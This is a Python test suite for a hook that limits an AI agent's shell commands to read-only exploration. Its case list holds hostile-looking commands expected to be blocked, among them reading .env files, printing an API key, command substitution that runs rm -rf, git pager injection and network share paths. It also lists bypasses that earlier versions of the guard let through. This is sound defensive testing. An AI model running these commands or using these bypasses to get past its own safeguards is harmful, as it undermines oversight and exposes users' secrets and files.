"""Tests for the Explore shell guard (the last line reads "mismatches: 0" when all pass).

    python tests/test_shell_guard.py               tests hooks/explore_shell_guard.py in this repository
    python tests/test_shell_guard.py --installed   tests the copy installed in ~/.claude/hooks

The first 25 cases are the original set (the PowerShell cases now expect a block: the guard blocks PowerShell
outright, since the agent only has Bash). The rest are the bypasses found in later reviews, each now blocked, and
the legitimate commands the agent needs, which must still pass.
"""
import json
import subprocess
import sys
from pathlib import Path

if "--guard" in sys.argv:  # used by install.py to test the copy it just installed
    GUARD = Path(sys.argv[sys.argv.index("--guard") + 1])
elif "--installed" in sys.argv:
    GUARD = Path.home() / ".claude" / "hooks" / "explore_shell_guard.py"
else:
    GUARD = Path(__file__).resolve().parent.parent / "hooks" / "explore_shell_guard.py"
TESTS = [
    # --- the original 25 ---
    ("Bash", 'ls -R "/c/work/project" 2>/dev/null | head -300 || true', True),
    ("Bash", "find /e/x -type f -not -path '*/.venv/*' -not -path '*/node_modules/*'", True),
    ("Bash", 'git -C "C:/work/app" log -1 --format="%H%n%ad" -- server/app/inbox.py', True),
    ("Bash", "cd /c/work/app && git log -1", True),
    ("Bash", "ls -a /e/x && find /e/x -name '*.py' | sort | head -50", True),
    ("PowerShell", r"Get-ChildItem -Recurse -File -Name -Path E:\x | Select-Object -First 50", False),
    ("PowerShell", r"git -C E:\x log -1", False),
    ("Bash", 'python -c "print(1)"', False),
    ("Bash", "find . -delete", False),
    ("Bash", "find . -name x -exec cat {} ;", False),
    ("Bash", "git -C E:/x status", False),
    ("Bash", "git -C E:/x checkout -- .", False),
    ("Bash", "ls > out.txt", False),
    ("Bash", "cat secrets.env", False),
    ("PowerShell", "Get-ChildItem | Where-Object { $_.Name -like '*.py' }", False),
    ("PowerShell", r"Get-Content E:\x\.env", False),
    ("Bash", "echo $(rm -rf x)", False),
    ("Bash", "git -c core.pager=evil log", False),
    ("Bash", "py -3 undo.py --check", False),
    ("Bash", "curl https://example.com", False),
    ("Bash", "head -50 C:/work/notes/answers.md", False),
    ("Bash", "ls && head .env", False),
    ("Bash", "ls | head /e/x/.env", False),
    ("Bash", "ls -la | sort | uniq | wc -l", True),
    ("PowerShell", "Get-ChildItem -Recurse | Select-Object FullName -First 20", False),
    # --- legitimate commands that must still pass ---
    ("Bash", "git --no-pager log --oneline -5 2>&1 | head -20", True),
    ("Bash", r"find /e/x \( -name '*.py' -o -name '*.js' \) -type f", True),
    ("Bash", "git -C /e/x ls-files --others --ignored --exclude-standard | head -50", False),  # v3: find lists them
    ("Bash", "ls E:/x/*.py", True),
    ("Bash", "git -C /e/x show --stat HEAD", False),  # v3: show and blame dropped (never used)
    ("Bash", "git -C /e/x blame -L 1,20 file.py", False),
    ("Bash", "ls /e/x | tail -n +5", True),
    ("Bash", "ls -a '/c/work/my folder' ; pwd", True),
    ("Bash", "find /e/x -maxdepth 2 -type d -name '.*' 2>/dev/null | sort -k1,1 | head -n 40", True),
    ("Bash", "echo --- && git -C /e/x log -3 --format='%h %ad %s' --date=short -- a.py", True),
    ("Bash", "git -C /e/x log -S'parse_date' --oneline", False),  # v3: log options are a fixed list now
    ("Bash", 'git -C "E:/x" log -1 --format=\'%H%n%an\' -- a.py; echo "exit=$?"', True),
    # --- bypasses found in review (all ALLOWED by version 1) ---
    ("Bash", 'echo "$(touch /tmp/pwned)"', False),
    ("Bash", 'ls "`touch /tmp/pwned`"', False),
    ("Bash", "ls\ntouch /tmp/pwned", False),
    ("Bash", "ls & touch /tmp/pwned", False),
    ("Bash", "git log -1 --format='x' --output=Makefile", False),
    ("Bash", "git show HEAD --output=notes", False),
    ("Bash", "git log --outp=notes", False),
    ("Bash", "git blame --contents=C:/Users/x/.env -- README.md", False),
    ("Bash", "git blame -S revs.txt file", False),
    ("Bash", "git show --ext-diff HEAD", False),
    ("Bash", "git log -p --textconv", False),
    ("Bash", "echo hi | sort -o Makefile", False),
    ("Bash", "echo hi | uniq - Makefile", False),
    ("Bash", "ls | sort --compress-program=evil", False),
    ("Bash", "echo $ANTHROPIC_API_KEY", False),
    # --- found while fixing: bash rejoins words, and wildcards can turn into options ---
    ("Bash", r"find . -ex\ec touch x \;", False),
    ("Bash", 'find . -e"x"ec touch x ;', False),
    ("Bash", "find . -del*", False),
    ("Bash", "git log *", False),
    ("Bash", "find . -files0-from .env", False),
    ("Bash", "find . -name x -rm", False),  # bfs (macOS and Linux) deletes with -rm
    ("Bash", "find . -type f -rm", False),
    ("Bash", "ls > /dev/nullx", False),
    ("Bash", "ls 2>/dev/null_evil", False),
    ("Bash", 'echo \\"; touch x; echo \\"', False),
    ("Bash", 'ls "unclosed', False),
    ("Bash", "(touch x)", False),
    ("Bash", "ls; (touch x)", False),
    ("Bash", "X=1 git log", False),
    ("Bash", 'bash -c "ls"', False),
    ("Bash", "ls | xargs rm", False),
    ("Bash", "ls | tee out", False),
    ("Bash", "", False),
    ("Bash", "git -C x --config-env=core.pager=EVIL log", False),
    ("Bash", "git --paginate log", False),
    ("Bash", "ls |& touch x", False),
    ("Bash", "ls; touch x", False),
    ("Bash", "ls 2>$null", False),
    ("Bash", "l? -a", False),
    # --- version 3: network paths ---
    ("Bash", "ls //evil.example.com/share", False),
    ("Bash", "ls '\\\\evil.example.com\\share'", False),
    ("Bash", "find //evil.example.com/share -type f", False),
    ("Bash", "cd //evil.example.com/share && ls", False),
    ("Bash", "git -C //evil.example.com/share/repo log -1", False),
    ("Bash", "ls //secretvalue.evil.example.com/x", False),
    ("Bash", r"ls \\\\evil.example.com\\share", False),
    ("Bash", r"ls /\/evil.example.com/share", False),
    ("Bash", "ls --hide=//evil.example.com/share", False),
    # --- version 3: git cut to log, ls-files and rev-parse, with allowed options only ---
    ("Bash", "git -C /e/x log -n 5 --name-status -- a.py", True),
    ("Bash", "git -C /e/x log --max-count=3 --pretty=format:'%h %s' --since=2026-11-01", True),
    ("Bash", "git -C /e/x rev-parse --show-toplevel", True),
    ("Bash", "git -C /e/x ls-files -- src", True),
    ("Bash", "git log --show-signature", False),
    ("Bash", "git log --format=%GS", False),
    ("Bash", "git log -p", False),
    ("Bash", "git ls-files -o", False),
    ("Bash", "git ls-files -m", False),
    ("Bash", "git blame -wSrevs.txt f", False),
    ("Bash", "git log --ou=x", False),
    ("Bash", "git show HEAD:a.py", False),
    # --- version 3: filters take a number only where a flag expects one ---
    ("Bash", "ls | sort 1.h", False),
    ("Bash", "ls | sort 2023.1.bin", False),
    ("Bash", "ls | head 5", False),
    ("Bash", "ls | tail +5", False),
    ("Bash", "ls | sort -k 2", True),
    ("Bash", "ls | head -20", True),
    ("Bash", "ls | head -n", False),
    # --- version 3: command names as written ---
    ("Bash", "FIND . -name x", False),
    ("Bash", "LS -la", False),
]
RAW = [("not JSON", b"{not json", False), ("a list, not an object", b"[1, 2]", False)]


def main() -> int:
    bad = 0
    for tool, cmd, want in TESTS:
        p = subprocess.run([sys.executable, str(GUARD)], capture_output=True,
                           input=json.dumps({"tool_name": tool, "tool_input": {"command": cmd}}).encode())
        allowed = p.returncode == 0
        bad += allowed != want
        print("PASS " if allowed == want else "WRONG", "allowed" if allowed else "blocked", "|", tool, "|", repr(cmd)[:80])
    for name, raw, want in RAW:
        p = subprocess.run([sys.executable, str(GUARD)], capture_output=True, input=raw)
        allowed = p.returncode == 0
        bad += allowed != want
        print("PASS " if allowed == want else "WRONG", "allowed" if allowed else f"blocked (exit {p.returncode})", "|", name)
    # Version 3: an allowed command gets no "allow" answer (the session's own check still decides) unless the hook's
    # command line carries --allow, as the test harness's does.
    call = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls -a"}}).encode()
    plain = subprocess.run([sys.executable, str(GUARD)], capture_output=True, input=call)
    harness = subprocess.run([sys.executable, str(GUARD), "--allow"], capture_output=True, input=call)
    for name, ok in (("no 'allow' answer without --allow", plain.returncode == 0 and not plain.stdout.strip()),
                     ("'allow' answer with --allow", harness.returncode == 0 and b'"allow"' in harness.stdout)):
        bad += not ok
        print("PASS " if ok else "WRONG", "|", name)
    print("cases:", len(TESTS) + len(RAW) + 2, "mismatches:", bad)
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
